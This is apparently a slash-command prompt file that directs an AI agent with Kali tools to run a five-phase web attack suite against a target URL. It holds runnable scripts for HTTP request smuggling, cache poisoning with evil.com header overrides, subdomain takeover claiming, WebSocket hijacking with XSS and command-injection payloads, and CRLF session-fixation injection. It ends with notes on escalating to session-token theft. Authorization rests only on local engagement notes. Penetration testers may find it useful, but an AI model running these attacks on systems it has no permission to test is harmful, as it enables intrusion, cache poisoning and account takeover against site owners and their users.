---
description: Advanced web attack suite — HTTP Request Smuggling, Web Cache Poisoning, Subdomain Takeover, WebSocket security, CRLF Injection
argument-hint: <target-url> (e.g. https://target.com)
allowed-tools: [mcp__kali-pentest__execute_kali_command, mcp__kali-pentest__execute_parallel, mcp__kali-pentest__get_job_output, mcp__kali-pentest__list_jobs]
---

# pt-web — Advanced Web Attack Suite

You are a senior penetration tester executing advanced web-layer attacks that are invisible to most automated scanners. These techniques exploit how proxies, CDNs, load balancers, and caches handle ambiguous or malformed HTTP — not just how the application handles user input.

**Before running**: Read the active engagement notes to avoid retesting confirmed vulnerabilities.

```bash
cat /home/kali/current/notes/engagement.md 2>/dev/null | grep -E "^## Finding:|^## Tested" | head -30
```

---

## Setup — Resolve Target

```bash
# Set from argument or active engagement
if [ -n "$ARGUMENTS" ]; then
    TARGET_URL="$ARGUMENTS"
    # strip trailing slash
    TARGET_URL="${TARGET_URL%/}"
else
    ENG=/home/kali/current
    TARGET_URL=$(grep -i '^\*\*Target' "$ENG/notes/engagement.md" 2>/dev/null | head -1 | sed 's/.*: *//' | sed 's/ .*//')
    [ -z "$TARGET_URL" ] && { echo "ERROR: No target. Pass URL as argument or run /pt-init first."; exit 1; }
    # ensure https prefix
    echo "$TARGET_URL" | grep -q "^http" || TARGET_URL="https://$TARGET_URL"
fi

DOMAIN=$(echo "$TARGET_URL" | sed 's|https\?://||' | cut -d/ -f1)
ENG=/home/kali/current
mkdir -p "$ENG/scans/web" "$ENG/poc/requests"

echo "=== pt-web: Advanced Web Attacks ==="
echo "Target URL : $TARGET_URL"
echo "Domain     : $DOMAIN"
echo "Engagement : $ENG"
echo ""
echo "Phases:"
echo "  1 — HTTP Request Smuggling (CL.TE / TE.CL / h2c)"
echo "  2 — Web Cache Poisoning"
echo "  3 — Subdomain Takeover"
echo "  4 — WebSocket Security"
echo "  5 — CRLF Injection"
```

---

## Phase 1 — HTTP Request Smuggling

**Why it matters**: When a front-end proxy and back-end server disagree on where one request ends and the next begins, an attacker can prepend data to another user's request — achieving account takeover, cache poisoning, or WAF bypass without any auth.

**Signal to look for**: `Transfer-Encoding: chunked` accepted by server, `Content-Length` and `TE` headers both processed, load balancer / reverse proxy in front of app (nginx+gunicorn, HAProxy+Apache, Cloudflare+origin).

```bash
TARGET_URL="$ARGUMENTS"
TARGET_URL="${TARGET_URL%/}"
ENG=/home/kali/current

echo "=== Phase 1: HTTP Request Smuggling ==="

# Install smuggler if not present
[ -f /opt/smuggler/smuggler.py ] || {
    echo "[*] Cloning smuggler..."
    git clone https://github.com/defparam/smuggler.git /opt/smuggler/ 2>/dev/null
}

# Run smuggler — detects CL.TE, TE.CL, TE.TE (obfuscation variants)
echo "[*] Running smuggler.py against $TARGET_URL"
timeout 60 python3 /opt/smuggler/smuggler.py -u "$TARGET_URL" -t 15 -m POST 2>/dev/null | \
    tee "$ENG/scans/web/smuggler.txt" | \
    grep -E "Issue|Vulnerable|CLTE|TECL|safe|timeout|error" | head -20

echo ""
echo "--- Full smuggler output: $ENG/scans/web/smuggler.txt ---"
wc -l "$ENG/scans/web/smuggler.txt" 2>/dev/null
```

```bash
TARGET_URL="$ARGUMENTS"
TARGET_URL="${TARGET_URL%/}"

echo "=== Phase 1b: Manual CL.TE Timing Probe ==="

# CL.TE: front-end uses Content-Length (6), back-end uses Transfer-Encoding
# If vulnerable: back-end waits for rest of chunk after receiving "0\r\n\r\n" — causes timeout
echo "[*] CL.TE timing probe (expect ~5s delay if vulnerable, instant if not):"
TIME=$(curl -sk -X POST "$TARGET_URL/" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Transfer-Encoding: chunked" \
    -H "Content-Length: 6" \
    --data-binary $'3\r\nabc\r\nX' \
    --max-time 8 -o /dev/null -w "%{time_total}" 2>/dev/null)
echo "  Response time: ${TIME}s"
if (( $(echo "$TIME > 4.5" | bc -l 2>/dev/null || echo 0) )); then
    echo "  [!] TIMING ANOMALY — possible CL.TE smuggling vulnerability"
else
    echo "  [OK] No significant delay"
fi

echo ""
echo "=== Phase 1c: TE.CL Timing Probe ==="
# TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length
# Payload: chunked body says 0 bytes but CL says more — back-end reads extra bytes from next request
TIME=$(curl -sk -X POST "$TARGET_URL/" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Transfer-Encoding: chunked" \
    -H "Content-Length: 3" \
    --data-binary $'0\r\n\r\n' \
    --max-time 8 -o /dev/null -w "%{time_total}" 2>/dev/null)
echo "  Response time: ${TIME}s"
if (( $(echo "$TIME > 4.5" | bc -l 2>/dev/null || echo 0) )); then
    echo "  [!] TIMING ANOMALY — possible TE.CL smuggling vulnerability"
else
    echo "  [OK] No significant delay"
fi

echo ""
echo "=== Phase 1d: h2c (HTTP/2 Cleartext Upgrade) Probe ==="
# Some front-ends forward h2c Upgrade headers to back-end, enabling HTTP/2 smuggling
H2C_CODE=$(curl -sk -X PRI "$TARGET_URL" \
    -H "Upgrade: h2c" \
    -H "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA" \
    -H "Connection: Upgrade, HTTP2-Settings" \
    -o /dev/null -w "%{http_code}" --max-time 5 2>/dev/null)
echo "  h2c Upgrade response code: $H2C_CODE"
[ "$H2C_CODE" = "101" ] && echo "  [!] 101 Switching Protocols — h2c upgrade accepted! Possible h2c smuggling."
[ "$H2C_CODE" = "200" ] && echo "  [?] 200 with h2c — back-end may have processed h2c directly"

echo ""
echo "=== Phase 1e: Transfer-Encoding Obfuscation ==="
# Some servers process TE headers with unusual capitalization/spacing that front-end normalizes
for te_variant in \
    "Transfer-Encoding: xchunked" \
    "Transfer-Encoding : chunked" \
    "Transfer-Encoding: chunked, identity" \
    "X-Transfer-Encoding: chunked" \
    "Transfer-Encoding: cow" \
    "Transfer-Encoding: chunked\r\nTransfer-Encoding: x"; do

    CODE=$(curl -sk -X POST "$TARGET_URL" \
        -H "$te_variant" \
        -H "Content-Length: 5" \
        --data-binary $'0\r\n\r\n' \
        -o /dev/null -w "%{http_code}" --max-time 5 2>/dev/null)
    echo "  TE variant: [$te_variant] → HTTP $CODE"
done
```

**Impact gate**: If any smuggling probe shows timing anomaly or smuggler reports CL.TE/TE.CL — this is typically Critical. Attempt a differential attack to confirm (send 2 requests, see if body of first leaks into second's response). Document in engagement.md.

**Exploitation context**: CL.TE/TE.CL confirmed → can poison requests of other users (cache poisoning, session theft), bypass WAF on protected endpoints, achieve reflected XSS on non-XSS endpoints. Reference: PortSwigger Web Security Academy — Request Smuggling.

```bash
# Save smuggling results
ENG=/home/kali/current
echo "" >> "$ENG/scans/web/smuggler.txt"
echo "Manual probes completed: $(date)" >> "$ENG/scans/web/smuggler.txt"
echo "[*] Smuggling phase complete. Review: $ENG/scans/web/smuggler.txt"
```

---

## Phase 2 — Web Cache Poisoning

**Why it matters**: If you can inject a malicious response into a shared cache, every subsequent user who requests that URL gets your poisoned response — stored XSS with CDN amplification.

**Signal to look for**: `X-Cache: HIT`, `CF-Cache-Status`, `Age` headers in responses. Reverse proxy (Varnish, Cloudflare, Fastly, nginx proxy_cache). Responses differ based on unkeyed headers (Host overrides, X-Forwarded-Host).

```bash
TARGET_URL="$ARGUMENTS"
TARGET_URL="${TARGET_URL%/}"
DOMAIN=$(echo "$TARGET_URL" | sed 's|https\?://||' | cut -d/ -f1)
ENG=/home/kali/current

echo "=== Phase 2: Web Cache Poisoning ==="

# Step 1: Establish cache behaviour baseline
echo "[*] Cache detection — baseline headers:"
curl -sk -D - "$TARGET_URL" -o /dev/null 2>/dev/null | \
    grep -iE "x-cache|age|cf-cache|cache-control|vary|surrogate|x-varnish|x-drupal-cache|x-wp-cf-super-cache" | head -15

echo ""
echo "[*] Cache keying test — send same request twice, look for Age increase:"
CODE1=$(curl -sk -D - "$TARGET_URL" -o /dev/null 2>/dev/null | grep -i "^age:" | head -1)
sleep 2
CODE2=$(curl -sk -D - "$TARGET_URL" -o /dev/null 2>/dev/null | grep -i "^age:" | head -1)
echo "  Request 1 Age: $CODE1"
echo "  Request 2 Age: $CODE2"
```

```bash
TARGET_URL="$ARGUMENTS"
TARGET_URL="${TARGET_URL%/}"
DOMAIN=$(echo "$TARGET_URL" | sed 's|https\?://||' | cut -d/ -f1)
ENG=/home/kali/current

echo "=== Phase 2b: Unkeyed Header Injection ==="
echo "Testing if injected Host-override headers are reflected in response body or redirect location..."
echo "(Reflected + cached = cache poisoning for all users)"
echo ""

# Use a unique canary value — if reflected, the response was generated with our poisoned header
CANARY="pt-web-probe-$(date +%s)"

for header in "X-Forwarded-Host" "X-Host" "X-Forwarded-Server" "X-HTTP-Host-Override" "X-Original-URL" "X-Rewrite-URL" "Forwarded"; do
    RESP=$(curl -sk -H "$header: $CANARY.evil.com" "$TARGET_URL" -D /tmp/cache_headers.txt 2>/dev/null)
    CACHE=$(grep -i "x-cache\|age\|cf-cache" /tmp/cache_headers.txt 2>/dev/null | head -2)
    if echo "$RESP" | grep -q "$CANARY"; then
        echo "  [CACHE POISON CANDIDATE] $header: reflected in body!"
        echo "    Cache headers: $CACHE"
        echo "    Context: $(echo "$RESP" | grep -o ".\{0,30\}$CANARY.\{0,30\}" | head -3)"
        echo "    → If X-Cache shows HIT on second request, this is exploitable"
    else
        echo "  [OK] $header: not reflected"
    fi
done

echo ""
echo "--- Redirect location injection ---"
# If app redirects with unkeyed host, the poisoned Location header gets cached
for header in "X-Forwarded-Host" "X-Host"; do
    LOCATION=$(curl -sk -H "$header: evil.com" "$TARGET_URL" -D - -o /dev/null 2>/dev/null | grep -i "^location:" | head -1)
    [ -n "$LOCATION" ] && echo "  [REDIRECT INJECTION] $header → $LOCATION"
done
```

```bash
TARGET_URL="$ARGUMENTS"
TARGET_URL="${TARGET_URL%/}"

echo "=== Phase 2c: Web Cache Deception ==="
echo "Appending static file extensions to sensitive paths — does cache serve private data?"
echo "(If /account.css returns account page AND cache serves it to others = account takeover)"
echo ""

# Sensitive paths to test
for path in "/account" "/profile" "/dashboard" "/settings" "/admin" "/api/me" "/user"; do
    for ext in ".css" ".js" ".jpg" ".png" ".ico" ".woff" ".svg" ".gif" ".json"; do
        FULL="$TARGET_URL$path$ext"
        CODE=$(curl -sk -o /tmp/cache_dec_resp.txt -w "%{http_code}" "$FULL" --max-time 5 2>/dev/null)
        if [ "$CODE" = "200" ]; then
            # Check if response contains account data (not just a static file)
            if grep -qiE "email|username|account|profile|balance|order|user_id|session" /tmp/cache_dec_resp.txt 2>/dev/null; then
                echo "  [CACHE DECEPTION HIT] $FULL → $CODE + contains user data!"
                head -3 /tmp/cache_dec_resp.txt
            fi
        fi
    done
done

echo ""
echo "=== Phase 2d: Fat GET (GET body injection) ==="
# Some caches key on URL only but forward GET body to origin — body can affect response
RESP=$(curl -sk -X GET "$TARGET_URL" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Content-Length: 10" \
    -d "x=injected" -D - 2>/dev/null | head -20)
echo "Fat GET response headers:"
echo "$RESP" | grep -iE "cache|age|location|set-cookie" | head -5

echo ""
echo "=== Phase 2e: Parameter Cloaking (Cache Key Bypass) ==="
# Some caches exclude query params but origin processes them — cloaking bypasses exclusion
for url in \
    "$TARGET_URL/?x=1;x=2" \
    "$TARGET_URL/?x=1%26x=2" \
    "$TARGET_URL/?x=1&_=nocache$(date +%s)" \
    "$TARGET_URL/index.html?x=1"; do
    CODE=$(curl -sk -o /dev/null -w "%{http_code}" "$url" --max-time 5 2>/dev/null)
    echo "  $url → $CODE"
done
```

---

## Phase 3 — Subdomain Takeover

**Why it matters**: If a subdomain's CNAME points to an external service where the account no longer exists, an attacker can register that service account and serve malicious content on the original subdomain — complete subdomain control including cookie theft if same-site.

**Signal to look for**: Subdomains with CNAME pointing to Heroku, GitHub Pages, S3, Netlify, Azure, Fastly — especially returning 404 or service-specific "no such app" error pages.

```bash
ENG=/home/kali/current
DOMAIN=$(cat "$ENG/notes/engagement.md" 2>/dev/null | grep -i "target" | head -1 | sed 's/.*: *//' | sed 's/ .*//' | sed 's|https\?://||' | cut -d/ -f1)
[ -z "$DOMAIN" ] && DOMAIN=$(echo "$ARGUMENTS" | sed 's|https\?://||' | cut -d/ -f1)

echo "=== Phase 3: Subdomain Takeover ==="
echo "Domain: $DOMAIN"
echo ""

# Build subdomain list from recon phase
SUBFILE="$ENG/recon/dns/subdomains_all.txt"
if [ ! -f "$SUBFILE" ] || [ $(wc -l < "$SUBFILE") -lt 5 ]; then
    echo "[*] No subdomain list found — running quick subfinder first..."
    subfinder -d "$DOMAIN" -silent 2>/dev/null | tee "$ENG/recon/dns/subdomains_all.txt" | head -5
    echo "  Found $(wc -l < "$ENG/recon/dns/subdomains_all.txt" 2>/dev/null) subdomains"
fi

echo "[*] Checking $(wc -l < "$SUBFILE" 2>/dev/null) subdomains for CNAME targets..."
echo ""

# Takeover fingerprint database: "error_string:service_name:registration_url"
declare -A FINGERPRINTS=(
    ["There isn't a GitHub Pages site here"]="GitHub Pages|https://pages.github.com"
    ["For root URLs (like http://www.example.com/) you can't use CNAME"]="GitHub|https://github.com"
    ["NoSuchBucket"]="AWS S3|https://s3.console.aws.amazon.com"
    ["The specified bucket does not exist"]="AWS S3|https://s3.console.aws.amazon.com"
    ["The bucket you are attempting"]="AWS S3|https://s3.console.aws.amazon.com"
    ["herokucdn.com/error-pages/no-such-app"]="Heroku|https://heroku.com"
    ["No such app"]="Heroku|https://heroku.com"
    ["doesn't exist"]="Shopify|https://shopify.com"
    ["Sorry, this shop is currently unavailable"]="Shopify|https://shopify.com"
    ["The thing you were looking for is no longer here"]="Tumblr|https://tumblr.com"
    ["fastly error: unknown domain"]="Fastly|https://fastly.com"
    ["Please check that the website address"]="Microsoft Azure|https://portal.azure.com"
    ["404 Web Site not found"]="Azure|https://portal.azure.com"
    ["Repository not found"]="Bitbucket|https://bitbucket.org"
    ["The feed has not been found"]="FeedPress|https://feedpress.com"
    ["This UserVoice subdomain is currently available"]="UserVoice|https://uservoice.com"
    ["project not found"]="GitLab|https://gitlab.com"
    ["This page is parked"]="Parked domain"
    ["Unrecognized domain"]="Netlify|https://netlify.com"
    ["Not found"]="Netlify|https://netlify.com"
    ["We could not find what you're looking for"]="Zendesk|https://zendesk.com"
    ["Help Center Closed"]="Zendesk|https://zendesk.com"
)

mkdir -p "$ENG/scans/web"
> "$ENG/scans/web/takeover_hits.txt"

# Process in batches of 20 — parallel CNAME + HTTP check
head -100 "$SUBFILE" | while read -r sub; do
    [ -z "$sub" ] && continue
    CNAME=$(dig CNAME +short "$sub" 2>/dev/null | head -1)
    [ -z "$CNAME" ] && continue

    # Only check subdomains with CNAMEs (dangling = external service)
    RESP=$(curl -sk "https://$sub" --max-time 8 -o /tmp/takeover_check.txt 2>/dev/null; cat /tmp/takeover_check.txt 2>/dev/null)
    [ -z "$RESP" ] && RESP=$(curl -sk "http://$sub" --max-time 8 2>/dev/null)

    for fp in "${!FINGERPRINTS[@]}"; do
        if echo "$RESP" | grep -qi "$fp"; then
            SERVICE="${FINGERPRINTS[$fp]%%|*}"
            REG_URL="${FINGERPRINTS[$fp]##*|}"
            echo "  [TAKEOVER POSSIBLE] $sub"
            echo "    CNAME  : $CNAME"
            echo "    Service: $SERVICE"
            echo "    Claim  : $REG_URL"
            echo "    Match  : $fp"
            echo "---" | tee -a "$ENG/scans/web/takeover_hits.txt"
            echo "$sub CNAME=$CNAME SERVICE=$SERVICE" >> "$ENG/scans/web/takeover_hits.txt"
            break
        fi
    done
done

HITS=$(wc -l < "$ENG/scans/web/takeover_hits.txt" 2>/dev/null)
echo ""
echo "[*] Takeover scan complete. Hits: $HITS"
[ "$HITS" -gt 0 ] && cat "$ENG/scans/web/takeover_hits.txt"
```

**Impact gate**: Any TAKEOVER POSSIBLE hit → attempt to claim the service (register GitHub Pages repo, create S3 bucket, etc.). If you can serve content on the subdomain, this is a **High** finding. If the subdomain shares cookies with the parent domain (same-site), it escalates to **Critical** (session theft via XSS on the takeover subdomain).

---

## Phase 4 — WebSocket Security Testing

**Why it matters**: WebSocket connections often bypass WAF rules, skip authorization checks (token only validated on handshake), and allow IDOR via channel/room subscriptions.

**Signal to look for**: `Upgrade: websocket` in requests, `ws://` or `wss://` in JavaScript source, real-time features (chat, notifications, live updates, trading prices, collaborative editing).

```bash
TARGET_URL="$ARGUMENTS"
TARGET_URL="${TARGET_URL%/}"
ENG=/home/kali/current

echo "=== Phase 4: WebSocket Security ==="

# Install wscat if needed
which wscat 2>/dev/null || npm install -g wscat 2>/dev/null

echo "[*] Discovering WebSocket endpoints from JS source..."
JS_DIR="$ENG/recon/http/js"
if [ -d "$JS_DIR" ]; then
    grep -rh "ws://\|wss://\|WebSocket\|new WebSocket\|io.connect\|socket.io" "$JS_DIR/" 2>/dev/null | \
        grep -oE "(wss?://[^\"']+|/socket\.io[^\"']*)" | sort -u | head -20
else
    # Quick JS grep from homepage
    curl -sk "$TARGET_URL" 2>/dev/null | grep -oE "(wss?://[^\"' <>]+|socket\.io)" | sort -u | head -10
fi

echo ""
echo "WebSocket endpoints to test manually:"
echo "  Set WS_URL below to a discovered WebSocket endpoint and run subsequent tests"
echo ""

# Detect Socket.IO (common framework)
curl -sk "$TARGET_URL/socket.io/" 2>/dev/null | head -3 | grep -q "io\|EIO" && \
    echo "  [DETECTED] Socket.IO endpoint at $TARGET_URL/socket.io/"
curl -sk "$TARGET_URL/ws" -o /dev/null -w "%{http_code}" 2>/dev/null | grep -q "101\|400" && \
    echo "  [DETECTED] WebSocket at $TARGET_URL/ws"
curl -sk "$TARGET_URL/api/ws" -o /dev/null -w "%{http_code}" 2>/dev/null | grep -q "101\|400" && \
    echo "  [DETECTED] WebSocket at $TARGET_URL/api/ws"
```

After discovering the WebSocket URL, test these attack patterns (replace `WS_URL` and `SESSION` with actual values):

```bash
# Set from discovered endpoint
WS_URL="wss://target.com/ws"   # replace with actual
SESSION="session_cookie=VALUE"  # replace with actual

echo "=== Phase 4b: WebSocket Authorization Tests ==="

echo "[*] Test 1: Connect without authentication (auth bypass)"
timeout 5 wscat -c "$WS_URL" 2>/dev/null | head -5
echo ""

echo "[*] Test 2: Connect with invalid/expired token"
timeout 5 wscat -c "$WS_URL" --header "Authorization: Bearer INVALID_TOKEN" 2>/dev/null | head -5
echo ""

echo "[*] Test 3: Origin validation bypass"
# WebSocket handshake Origin header — if server doesn't validate, cross-site WebSocket hijacking
timeout 5 wscat -c "$WS_URL" --header "Origin: https://evil.com" 2>/dev/null | head -5
echo ""

echo "[*] Test 4: Subscribe to another user's channel (IDOR)"
# Many WS apps allow subscribing to any channel ID without auth check
for channel_id in 1 2 3 100 999; do
    echo "{\"action\":\"subscribe\",\"channel\":\"user_$channel_id\"}" | \
        timeout 5 wscat -c "$WS_URL" --header "Cookie: $SESSION" 2>/dev/null | head -3
done
echo ""

echo "[*] Test 5: XSS via WebSocket message"
# If WS messages are reflected in DOM without sanitization
echo '{"type":"message","content":"<img src=x onerror=alert(1)>","room":"general"}' | \
    timeout 5 wscat -c "$WS_URL" --header "Cookie: $SESSION" 2>/dev/null | head -5
echo ""

echo "[*] Test 6: Command injection via WebSocket"
for payload in '$(id)' '`id`' '; ls -la;' '| whoami'; do
    echo "{\"action\":\"ping\",\"host\":\"$payload\"}" | \
        timeout 5 wscat -c "$WS_URL" --header "Cookie: $SESSION" 2>/dev/null | head -3
done
```

**Impact gate**:
- No-auth connection accepted → **High** (CSWSH — cross-site WebSocket hijacking if Origin not validated)
- IDOR via channel subscribe → **High** (data of other users accessible)
- XSS via message → **Medium** (if reflected to other users, escalates to **High**)
- Origin bypass → **Medium-High** (depends on what the socket exposes)

---

## Phase 5 — CRLF Injection / HTTP Response Splitting

**Why it matters**: If `\r\n` (CRLF) characters aren't stripped, an attacker can inject arbitrary HTTP headers into the response — setting cookies on behalf of the user (session fixation), splitting the response to inject fake HTTP responses, or poisoning the cache.

**Signal to look for**: Redirect parameters (`?redirect=`, `?return=`, `?next=`, `?url=`), URL path values reflected in Location headers, any parameter that ends up in response headers.

```bash
TARGET_URL="$ARGUMENTS"
TARGET_URL="${TARGET_URL%/}"
ENG=/home/kali/current

echo "=== Phase 5: CRLF Injection ==="

# CRLF payloads — multiple encodings
PAYLOADS=(
    "%0d%0aSet-Cookie:crlf=injected"
    "%0aSet-Cookie:crlf=injected"
    "%0d%0a%20Set-Cookie:crlf=injected"
    "%E5%98%8A%E5%98%8DSet-Cookie:crlf=injected"
    "%23%0d%0aSet-Cookie:crlf=injected"
    "%3f%0d%0aSet-Cookie:crlf=injected"
    "/%0d%0aSet-Cookie:crlf=injected"
    "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>injected</html>"
)

echo "[*] Testing CRLF in URL path/query..."
for payload in "${PAYLOADS[@]}"; do
    RESP=$(curl -sk -D - "$TARGET_URL/?x=$payload" --max-time 5 2>/dev/null | head -30)
    if echo "$RESP" | grep -i "Set-Cookie: crlf=injected" 2>/dev/null; then
        echo "  [CRLF INJECTION] ?x=$payload"
        echo "  Response headers:"
        echo "$RESP" | grep -iE "set-cookie|location|content-type" | head -5
        echo ""
    fi
done

echo ""
echo "[*] Testing CRLF in redirect parameters..."
for param in redirect return next url location back goto continue; do
    for payload in "${PAYLOADS[@]}"; do
        RESP=$(curl -sk -D - "$TARGET_URL?$param=/path$payload" --max-time 5 -o /dev/null 2>/dev/null)
        if echo "$RESP" | grep -i "Set-Cookie: crlf=injected" 2>/dev/null; then
            echo "  [CRLF INJECTION] param=$param payload=$payload"
        fi
    done
done

echo ""
echo "[*] Testing CRLF in common redirect paths..."
for path in "/login" "/logout" "/auth" "/redirect" "/api/redirect"; do
    for payload in "${PAYLOADS[@]}"; do
        RESP=$(curl -sk -D - "$TARGET_URL$path?next=/$payload" --max-time 5 -o /dev/null 2>/dev/null)
        if echo "$RESP" | grep -i "Set-Cookie: crlf=injected" 2>/dev/null; then
            echo "  [CRLF INJECTION] $path?next=/$payload"
        fi
    done
done
```

```bash
TARGET_URL="$ARGUMENTS"
TARGET_URL="${TARGET_URL%/}"

echo "=== Phase 5b: Header Injection via User-Agent / Referrer ==="
# Some apps log and reflect request headers — test if CRLF in headers leaks to response
CRLF_UA="Mozilla/5.0%0d%0aSet-Cookie:crlf=injected"
RESP=$(curl -sk -D - "$TARGET_URL" \
    -A "$CRLF_UA" \
    --max-time 5 2>/dev/null | head -20)
echo "$RESP" | grep -i "crlf=injected" && echo "  [CRLF via User-Agent] Header injection confirmed!"

echo ""
echo "=== Phase 5c: Open Redirect (prerequisite to CRLF impact) ==="
# Open redirect alone is Low-Medium; combined with CRLF = session fixation = High
for param in redirect return next url location back goto continue to href; do
    CODE=$(curl -sk -D - "$TARGET_URL?$param=https://evil.com" \
        -o /dev/null -w "%{http_code}" --max-time 5 2>/dev/null)
    LOCATION=$(curl -sk -D - "$TARGET_URL?$param=https://evil.com" \
        -o /dev/null 2>/dev/null | grep -i "^location:" | head -1)
    if echo "$LOCATION" | grep -q "evil.com"; then
        echo "  [OPEN REDIRECT] ?$param=https://evil.com → $LOCATION (HTTP $CODE)"
    fi
done
```

---

## Phase 6 — Save Results & Update Engagement

```bash
ENG=/home/kali/current

echo "=== pt-web: Results Summary ==="
echo ""
echo "Smuggling:"
[ -f "$ENG/scans/web/smuggler.txt" ] && grep -iE "issue|vulnerable|CLTE|TECL" "$ENG/scans/web/smuggler.txt" | head -5 || echo "  No results"
echo ""
echo "Cache Poisoning:"
echo "  Review output above for CACHE POISON CANDIDATE hits"
echo ""
echo "Subdomain Takeover:"
[ -s "$ENG/scans/web/takeover_hits.txt" ] && cat "$ENG/scans/web/takeover_hits.txt" || echo "  No takeover candidates found"
echo ""
echo "WebSocket:"
echo "  Review Phase 4 output for auth bypass / IDOR / origin bypass hits"
echo ""
echo "CRLF:"
echo "  Review Phase 5 output for CRLF INJECTION hits"
echo ""
echo "Output files:"
ls -la "$ENG/scans/web/" 2>/dev/null
echo ""
echo "To add a finding:"
echo "  cat >> $ENG/notes/engagement.md << 'EOF'"
echo "  ## Finding: <name>"
echo "  **Severity**: High"
echo "  **Endpoint**: ..."
echo "  **Impact**: ..."
echo "  EOF"
```

---

## CVSS Guidance for This Skill's Findings

| Finding | Typical CVSS | Vector |
|---------|-------------|--------|
| HTTP Request Smuggling (confirmed) | 8.1–9.0 | AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N |
| Web Cache Poisoning (XSS impact) | 8.1 | AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:L/A:N |
| Subdomain Takeover (cookie scope) | 8.1 | AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N |
| Subdomain Takeover (no cookie) | 6.1 | AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N |
| WebSocket auth bypass | 7.5 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| WebSocket IDOR | 6.5 | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N |
| CRLF injection (session fixation) | 6.1 | AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N |
| Open redirect | 4.7 | AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N |

---

## Expert Notes — Think Like a Human Hacker

**HTTP Request Smuggling**: Front-end/back-end disagreement is architectural — not a one-endpoint bug. Once confirmed, the impact is always higher than it appears. Think: can I use this to bypass auth on an admin endpoint that the front-end WAF protects? Can I poison the front-end's response cache? Can I steal session tokens from `/api/session`?

**Cache Poisoning**: The key insight is "what makes this response unique?" If the cache key is just the URL but the response changes based on an X-Forwarded-Host header — you can serve a poisoned response to millions of users by requesting once with the evil header. Always verify by requesting again *without* the header after the first poisoned request and checking if the response still contains your canary.

**Subdomain Takeover**: Most bug bounty hunters stop at "CNAME to external service." Go further — claim the service, host an HTML page, and check if `document.cookie` includes auth cookies from the parent domain. That's the difference between a Low and a Critical.

**WebSockets**: Authorization is often checked only during the HTTP handshake, not on each message. Test: complete the handshake with a valid session, then send messages intended for other users or admin channels. The server often trusts the already-authenticated connection unconditionally.

**CRLF**: The most useful primitive is `Set-Cookie:` injection. Combined with a forced login CSRF, you can fix a victim's session ID before they authenticate — session fixation to account takeover.
